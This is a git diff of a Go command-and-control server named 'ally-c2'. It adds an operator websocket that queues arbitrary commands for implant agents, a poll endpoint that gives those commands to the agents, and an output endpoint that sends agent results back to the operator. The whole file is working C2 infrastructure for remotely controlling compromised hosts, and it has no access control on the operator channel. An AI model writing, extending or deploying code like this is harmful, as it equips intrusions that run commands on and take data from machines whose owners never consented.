@@ -6,27 +6,29 @@ import (
 	"sync"
 	"time"
 
-	"github.com/gin-gonic/gin"
 	"github.com/coder/websocket"
 	"github.com/coder/websocket/wsjson"
+	"github.com/gin-gonic/gin"
 )
 
-
-//single active agent strcut
+//struct for single agent
 type AgentSession struct {
 	ID          string    `json:"id"`
 	LastSeen    time.Time `json:"last_seen"`
-	TaskQueue   []string  `json:"task_queue"`   // agent commands queue
-	OutputQueue []string  `json:"output_queue"` // latest agent ouput
+	TaskQueue   []string  `json:"task_queue"`   // agent task list
+	OutputQueue []string  `json:"output_queue"` // agent output list 
 }
-
-//map of all the agents
+//map off al the agents
 var (
 	clients = make(map[string]*AgentSession)
 	mu      sync.Mutex
+	operatorConn     *websocket.Conn 
+	operatorConnMu   sync.Mutex      
 )
 
 
+
+//cli/operator endpoint
 func handleOperator(c *gin.Context) {
 	opts := &websocket.AcceptOptions{
 		InsecureSkipVerify: true,
@@ -39,8 +41,19 @@ func handleOperator(c *gin.Context) {
 	}
 	defer conn.Close(websocket.StatusNormalClosure, "Closing session")
 
-	log.Println("[*] operator connected with success!")
+	//save operator connection 
+	operatorConnMu.Lock()
+	operatorConn = conn
+	operatorConnMu.Unlock()
 
+	//clean them variable when the ws close
+	defer func() {
+		operatorConnMu.Lock()
+		operatorConn = nil
+		operatorConnMu.Unlock()
+	}()
+
+	log.Println("[*] Operator connected with success!")
 	ctx := c.Request.Context()
 
 	for {
@@ -51,51 +64,151 @@ func handleOperator(c *gin.Context) {
 			break
 		}
 
-		log.Printf("[Command recived] -> Action: %v, Arg: %v", msg["action"], msg["data"])
-
-		response := map[string]string{
-			"status": "success",
-			"output": "Command recived in elaboration fase",
+		action, ok := msg["action"].(string)
+		if !ok {
+			continue
 		}
-		err = wsjson.Write(ctx, conn, response)
-		if err != nil {
-			log.Printf("[-] error sending msg back: %v", err)
-			break
+
+		log.Printf("[Command received] -> Action: %v", action)
+
+		// add task cli to queue
+		if action == "queue_task" {
+			agentID := msg["agent_id"].(string)
+			command := msg["data"].(string)
+
+			mu.Lock()
+			// Se l'agente non esiste, lo creiamo al volo
+			if _, exists := clients[agentID]; !exists {
+				clients[agentID] = &AgentSession{
+					ID:        agentID,
+					LastSeen:  time.Now(),
+					TaskQueue: []string{},
+				}
+			}
+
+			clients[agentID].TaskQueue = append(clients[agentID].TaskQueue, command)
+			mu.Unlock()
+
+			log.Printf("[+] Task '%s' accodato per l'agente %s", command, agentID)
+
+			wsjson.Write(ctx, conn, map[string]string{
+				"status": "success",
+				"output": "Task successfully queued on server.",
+			})
+		} else if action == "list_agents" {
+			mu.Lock()
+			var agentList []string
+			for id := range clients {
+				agentList = append(agentList, id)
+			}
+			mu.Unlock()
+
+			wsjson.Write(ctx, conn, map[string]interface{}{
+				"status": "success",
+				"agents": agentList,
+			})
 		}
 	}
 }
 
-func main() {
-	r := gin.Default()
 
+
+
+//#############################################
+func main() {
+
+	r := gin.Default()
 	port := ":8080"
 
-	//operator enpoint 
-	//cli endpoint with ws
+	// operator ep
 	r.GET("/ws/operator", handleOperator)
 
 
-	//agent endpoints--------
-	//direct shell access with ws
-	r.GET("/api/ws/dirsh", handleOperator)
-	
-	//task poll ep
+
+	// GET /api/agent/poll?id=<agent id>
 	r.GET("/api/agent/poll", func(c *gin.Context) {
+		agentID := c.Query("id")
+		if agentID == "" {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "Missing agent ID"})
+			return
+		}
+
+		mu.Lock()
+		defer mu.Unlock()
+
+		session, exists := clients[agentID]
+		//automatinc session
+		if !exists {
+			clients[agentID] = &AgentSession{
+				ID:        agentID,
+				LastSeen:  time.Now(),
+				TaskQueue: []string{},
+			}
+			c.JSON(http.StatusOK, gin.H{"status": "no_tasks", "command": ""})
+			return
+		}
+
+		session.LastSeen = time.Now()
+
+		if len(session.TaskQueue) == 0 {
+			c.JSON(http.StatusOK, gin.H{"status": "no_tasks", "command": ""})
+			return
+		}
+
+		//fifo of the fist comand
+		command := session.TaskQueue[0]
+		session.TaskQueue = session.TaskQueue[1:]
+
 		c.JSON(http.StatusOK, gin.H{
-			"status": "no_tasks",
-			"command": "",
+			"status":  "task_assigned",
+			"command": command,
 		})
 	})
 
-	//command output ep
+
+
+	// POST /api/agent/output
 	r.POST("/api/agent/output", func(c *gin.Context) {
-		c.JSON(http.StatusOK, gin.H{
-			"status": "received",
-		})
+		var req struct {
+			ID     string `json:"id"`
+			Output string `json:"output"`
+		}
+
+		if err := c.BindJSON(&req); err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"status": "error", "message": "Invalid JSON"})
+			return
+		}
+
+		mu.Lock()
+		if session, exists := clients[req.ID]; exists {
+			session.OutputQueue = append(session.OutputQueue, req.Output)
+			session.LastSeen = time.Now()
+		}
+		mu.Unlock()
+
+		log.Printf("\n[Output ricevuto dall'agente %s]:\n%s\n", req.ID, req.Output)
+
+		operatorConnMu.Lock()
+		if operatorConn != nil {
+			ctx := c.Request.Context()
+			pushMsg := map[string]string{
+				"type":   "agent_output",
+				"agent_id": req.ID,
+				"output": req.Output,
+			}
+			//send output with ws
+			_ = wsjson.Write(ctx, operatorConn, pushMsg)
+		}
+		operatorConnMu.Unlock()
+
+		c.JSON(http.StatusOK, gin.H{"status": "received"})
 	})
 
-	log.Printf("[*] ally-c2 listening on %s...", port)
-	
+
+
+
+	// connection error error 
+	log.Printf("[*] ally-c2 server (Go) listening on %s...", port)
 	err := r.Run(port)
 	if err != nil {
 		log.Fatalf("Error: critical server error: %v", err)
